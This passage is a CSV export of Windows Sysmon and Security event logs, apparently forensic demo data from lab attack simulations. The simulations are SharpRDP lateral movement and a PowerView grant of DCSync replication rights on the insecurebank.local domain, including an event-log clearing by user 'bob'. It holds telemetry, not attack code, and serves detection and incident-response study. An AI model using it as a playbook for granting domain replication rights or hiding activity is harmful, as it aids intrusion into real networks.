AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-1350-5f08-0000-0020e7030000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18""},{""@Name"":""ParentProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ParentProcessId"",""#text"":""628""},{""@Name"":""ParentImage"",""#text"":""?""},{""@Name"":""ParentCommandLine"",""#text"":""?""}]}}"
32,311383,2020-07-09 22:06:07.4872740,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 3248, ProcessGUID: 747f3d96-94cf-5f07-0000-0010bd590400","RuleName: ","SHA1=BACA86CCD45F8B5C27D0E9605B74B5FE924526B8,MD5=E1CB52C97C27F702CC96CF886B67FB8B,SHA256=B47C78A36A4DB2FB653876F4D6BD3DD7726CD311C2B2F8204CE8ED21EBD700F2,IMPHASH=6D78CE65118DF73A9E7BEAC9366C186A",ParentProcess: C:\Windows\System32\userinit.exe,"ParentProcessID: 5084, ParentProcessGUID: 747f3d96-94cf-5f07-0000-0010444f0400",ParentCommandLine: C:\Windows\system32\userinit.exe,C:\Windows\Explorer.EXE,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:06:07.353""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010bd590400""},{""@Name"":""ProcessId"",""#text"":""3248""},{""@Name"":""Image"",""#text"":""C:\\Windows\\explorer.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1217 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows Explorer""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""EXPLORER.EXE""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-94cd-5f07-0000-0020abbf0300""},{""@Name"":""LogonId"",""#text"":""0x3BFAB""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=BACA86CCD45F8B5C27D0E9605B74B5FE924526B8,MD5=E1CB52C97C27F702CC96CF886B67FB8B,SHA256=B47C78A36A4DB2FB653876F4D6BD3DD7726CD311C2B2F8204CE8ED21EBD700F2,IMPHASH=6D78CE65118DF73A9E7BEAC9366C186A""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010444f0400""},{""@Name"":""ParentProcessId"",""#text"":""5084""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\userinit.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\userinit.exe""}]}}"
33,311384,2020-07-09 22:06:14.1120180,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 3248, ProcessGUID: 747f3d96-94cf-5f07-0000-0010bd590400","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:06:14.101""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010bd590400""},{""@Name"":""ProcessId"",""#text"":""3248""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
34,311385,2020-07-09 22:06:14.2294822,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 3248, ProcessGUID: 747f3d96-94cf-5f07-0000-0010bd590400","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:06:14.212""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010bd590400""},{""@Name"":""ProcessId"",""#text"":""3248""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
35,311386,2020-07-09 22:06:20.1849833,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 3248, ProcessGUID: 747f3d96-94cf-5f07-0000-0010bd590400","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:06:20.180""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010bd590400""},{""@Name"":""ProcessId"",""#text"":""3248""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
36,311387,2020-07-09 22:06:20.1850455,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 3248, ProcessGUID: 747f3d96-94cf-5f07-0000-0010bd590400","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\d,Details: eventvwr\1,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:06:20.180""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010bd590400""},{""@Name"":""ProcessId"",""#text"":""3248""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\d""},{""@Name"":""Details"",""#text"":""eventvwr\\1""}]}}"
37,311388,2020-07-09 22:06:20.1851074,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 3248, ProcessGUID: 747f3d96-94cf-5f07-0000-0010bd590400","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\MRUList,Details: dcba,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:06:20.180""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010bd590400""},{""@Name"":""ProcessId"",""#text"":""3248""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\MRUList""},{""@Name"":""Details"",""#text"":""dcba""}]}}"
38,311389,2020-07-09 22:07:33.8002087,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 7128, ProcessGUID: 747f3d96-94dc-5f07-0000-00102fb00700","RuleName: ",Image: C:\Windows\system32\mmc.exe,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:07:33.789""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94dc-5f07-0000-00102fb00700""},{""@Name"":""ProcessId"",""#text"":""7128""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\mmc.exe""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
1,198242566,2019-03-25 21:28:11.0736269,1102,Info,Microsoft-Windows-Eventlog,Security,744,3396,DC1.insecurebank.local,0,,Event log cleared,insecurebank\bob,,SID: (S-1-5-21-738609754-2819869699-4189121830-1108),,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-738609754-2819869699-4189121830-1108"",""SubjectUserName"":""bob"",""SubjectDomainName"":""insecurebank"",""SubjectLogonId"":""0x8D7099""}}}"
2,198242568,2019-03-25 21:28:35.4366329,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9},ObjectName: %{c6faf700-bfe4-452a-a766-424f84c29583},"AccessList: Unknown code (%%1539, )",AccessMask: Unknown code (0x40000),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{19195a5b-6da0-11d0-afd3-00c04fd930c9}""},{""@Name"":""ObjectName"",""#text"":""%{c6faf700-bfe4-452a-a766-424f84c29583}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%1539, ""},{""@Name"":""AccessMask"",""#text"":""0x40000""},{""@Name"":""Properties"",""#text"":""%%1539, {19195a5b-6da0-11d0-afd3-00c04fd930c9}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
3,198242569,2019-03-25 21:28:35.4406162,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9},ObjectName: %{c6faf700-bfe4-452a-a766-424f84c29583},"AccessList: Unknown code (%%1539, )",AccessMask: Unknown code (0x40000),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{19195a5b-6da0-11d0-afd3-00c04fd930c9}""},{""@Name"":""ObjectName"",""#text"":""%{c6faf700-bfe4-452a-a766-424f84c29583}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%1539, ""},{""@Name"":""AccessMask"",""#text"":""0x40000""},{""@Name"":""Properties"",""#text"":""%%1539, {19195a5b-6da0-11d0-afd3-00c04fd930c9}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
4,198242572,2019-03-25 21:28:35.4586188,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3300,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9},ObjectName: %{c6faf700-bfe4-452a-a766-424f84c29583},"AccessList: Unknown code (%%1539, )",AccessMask: Unknown code (0x40000),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{19195a5b-6da0-11d0-afd3-00c04fd930c9}""},{""@Name"":""ObjectName"",""#text"":""%{c6faf700-bfe4-452a-a766-424f84c29583}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%1539, ""},{""@Name"":""AccessMask"",""#text"":""0x40000""},{""@Name"":""Properties"",""#text"":""%%1539, {19195a5b-6da0-11d0-afd3-00c04fd930c9}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
5,198242574,2019-03-25 21:28:35.4616137,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3300,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9},ObjectName: %{c6faf700-bfe4-452a-a766-424f84c29583},"AccessList: Unknown code (%%1539, )",AccessMask: Unknown code (0x40000),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{19195a5b-6da0-11d0-afd3-00c04fd930c9}""},{""@Name"":""ObjectName"",""#text"":""%{c6faf700-bfe4-452a-a766-424f84c29583}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%1539, ""},{""@Name"":""AccessMask"",""#text"":""0x40000""},{""@Name"":""Properties"",""#text"":""%%1539, {19195a5b-6da0-11d0-afd3-00c04fd930c9}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
6,198242576,2019-03-25 21:28:35.4636251,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3300,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9},ObjectName: %{c6faf700-bfe4-452a-a766-424f84c29583},"AccessList: Unknown code (%%1539, )",AccessMask: Unknown code (0x40000),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{19195a5b-6da0-11d0-afd3-00c04fd930c9}""},{""@Name"":""ObjectName"",""#text"":""%{c6faf700-bfe4-452a-a766-424f84c29583}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%1539, ""},{""@Name"":""AccessMask"",""#text"":""0x40000""},{""@Name"":""Properties"",""#text"":""%%1539, {19195a5b-6da0-11d0-afd3-00c04fd930c9}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
7,198242577,2019-03-25 21:28:35.4656163,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3300,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9},ObjectName: %{c6faf700-bfe4-452a-a766-424f84c29583},"AccessList: Unknown code (%%1539, )",AccessMask: Unknown code (0x40000),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{19195a5b-6da0-11d0-afd3-00c04fd930c9}""},{""@Name"":""ObjectName"",""#text"":""%{c6faf700-bfe4-452a-a766-424f84c29583}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%1539, ""},{""@Name"":""AccessMask"",""#text"":""0x40000""},{""@Name"":""Properties"",""#text"":""%%1539, {19195a5b-6da0-11d0-afd3-00c04fd930c9}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
8,198242578,2019-03-25 21:28:35.4676132,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,896,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9},ObjectName: %{c6faf700-bfe4-452a-a766-424f84c29583},"AccessList: Unknown code (%%1539, )",AccessMask: Unknown code (0x40000),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{19195a5b-6da0-11d0-afd3-00c04fd930c9}""},{""@Name"":""ObjectName"",""#text"":""%{c6faf700-bfe4-452a-a766-424f84c29583}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%1539, ""},{""@Name"":""AccessMask"",""#text"":""0x40000""},{""@Name"":""Properties"",""#text"":""%%1539, {19195a5b-6da0-11d0-afd3-00c04fd930c9}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
9,198242579,2019-03-25 21:28:35.4706158,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9},ObjectName: %{c6faf700-bfe4-452a-a766-424f84c29583},"AccessList: Unknown code (%%1539, )",AccessMask: Unknown code (0x40000),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{19195a5b-6da0-11d0-afd3-00c04fd930c9}""},{""@Name"":""ObjectName"",""#text"":""%{c6faf700-bfe4-452a-a766-424f84c29583}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%1539, ""},{""@Name"":""AccessMask"",""#text"":""0x40000""},{""@Name"":""Properties"",""#text"":""%%1539, {19195a5b-6da0-11d0-afd3-00c04fd930c9}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
10,198242581,2019-03-25 21:28:35.4726142,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3300,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9},ObjectName: %{c6faf700-bfe4-452a-a766-424f84c29583},"AccessList: Unknown code (%%1539, )",AccessMask: Unknown code (0x40000),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{19195a5b-6da0-11d0-afd3-00c04fd930c9}""},{""@Name"":""ObjectName"",""#text"":""%{c6faf700-bfe4-452a-a766-424f84c29583}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%1539, ""},{""@Name"":""AccessMask"",""#text"":""0x40000""},{""@Name"":""Properties"",""#text"":""%%1539, {19195a5b-6da0-11d0-afd3-00c04fd930c9}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
11,198242588,2019-03-25 21:28:45.0226312,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,896,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""2ea9670c-f0f9-4d3f-90e5-a087e8c05863""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6